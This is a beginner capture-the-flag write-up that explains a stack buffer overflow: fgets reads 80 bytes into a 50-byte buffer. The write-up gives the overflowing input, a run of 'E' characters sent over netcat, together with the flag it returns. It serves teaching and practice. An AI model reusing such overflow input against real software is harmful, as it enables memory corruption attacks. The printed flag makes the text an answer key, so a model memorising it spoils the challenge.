# Starter Buffer (beginner)
Tell me your favorite number and I might give you the flag ;).

`nc chall.pwnoh.io 13372`

## Files
* buffer
* Dockerfile
* starter-buffer.c

## Solution
The program sets the variable `flag` to `0xaabdcdee`. Later this variable is checked for the value `0x45454545` to execute the `print_flag` function, but we have no chance to input data into this variable:
```c
    int flag = 0xaabdcdee;
    char buf[50] = {0};
	printf("Enter your favorite number: ");
	fgets(buf, 0x50, stdin);

    if(flag == 0x45454545){
        print_flag();
    }
```

But the program uses `fgets` to read the user input. This function can be abused to overflow the buffer. If we enter a value, that is larger than the variable `buf`, it overwrites the data that is stored next to the variable on the stack. And here is also the variable `flag` located.

So to get the flag, we have to enter a value that is bigger than our buffer and overwrite `flag` with `0x45454545`, which is the ASCII representation for the character `E`:
```
$ nc chall.pwnoh.io 13372
Enter your favorite number: EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
bctf{wHy_WriTe_OveR_mY_V@lUeS}
$
```